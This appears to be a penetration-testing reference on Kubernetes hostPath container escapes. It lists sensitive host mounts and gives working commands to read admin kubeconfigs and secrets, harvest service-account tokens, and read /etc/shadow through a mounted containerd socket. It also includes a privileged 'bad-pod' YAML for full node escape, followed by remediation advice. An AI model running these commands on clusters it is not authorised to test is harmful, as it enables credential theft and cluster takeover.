# Kubernetes hostPath Mount Escape

## Overview

Kubernetes `hostPath` volumes mount a path from the **host node's filesystem** directly into a pod. Misconfigured pods that mount sensitive host paths allow reading host credentials, escaping the container, or pivoting to cluster-admin.

## Sensitive hostPath Targets

| Mount Target | What It Exposes |
|-------------|-----------------|
| `/` | Full host filesystem — read kubeconfig, write cron, SSH keys |
| `/etc/kubernetes` | Control plane certificates and kubeconfig (if on control plane node) |
| `/var/lib/kubelet` | Node certificates, pod specs, SA tokens of all pods on node |
| `/var/lib/docker` | Container layers, images, runtime secrets |
| `/run/containerd/containerd.sock` | containerd runtime socket — same as docker.sock escape |
| `/var/run/docker.sock` | Docker socket — arbitrary container creation |
| `/proc` | Host process namespace, kernel parameters |
| `/sys/fs/cgroup` | cgroup manipulation for privileged escape |
| `/root` | Root home directory, SSH keys, history |
| `/etc/ssh` | SSH host keys |

## Detection

```sh
# Inside pod: check mountinfo
cat /proc/self/mountinfo | grep -v "overlay\|tmpfs\|cgroup\|proc\|sysfs"

# Look for sensitive paths in mounts
grep -E "etc/kubernetes|var/lib/kubelet|docker.sock|containerd.sock|/root" /proc/self/mountinfo
```

## Exploitation

### Scenario 1: Full / mount

```sh
# Mounted as /host inside container
ls /host/etc/kubernetes/admin.conf  # control plane kubeconfig

# Copy kubeconfig for use
export KUBECONFIG=/host/etc/kubernetes/admin.conf
kubectl get secrets --all-namespaces
```

### Scenario 2: /var/lib/kubelet mount

```sh
# Access all SA tokens for pods on this node
find /host-kubelet/pods -name "token" 2>/dev/null

# Access node certificates
ls /host-kubelet/pki/
```

### Scenario 3: containerd/docker socket mount

```sh
# Use mounted containerd socket to create privileged container
ctr --address /run/containerd/containerd.sock run \
  --privileged --mount type=bind,src=/,dst=/host,options=rbind \
  docker.io/library/alpine:latest pwn \
  chroot /host cat /etc/shadow
```

### Scenario 4: Create privileged pod via API (if create pods permission exists)

```sh
# deepce
./deepce.sh -e K8S_POD -cmd "cat /etc/shadow"
```

## Create Bad Pod via kubectl

```yaml
# bad-pod.yaml — full node escape
apiVersion: v1
kind: Pod
metadata:
  name: bad-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: bad-pod
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

## Remediation

- Apply Pod Security Standards (`restricted` or at minimum `baseline`)
- Use OPA/Gatekeeper or Kyverno to deny `hostPath: {path: /}` and sensitive paths
- Set `readOnly: true` on hostPath mounts where writes aren't needed
- Restrict `create pods` RBAC permission to trusted service accounts only

## References

- https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
- https://www.sentinelone.com/blog/climbing-the-ladder-kubernetes-privilege-escalation-part-1/
- https://kubernetes.io/docs/concepts/security/pod-security-standards/
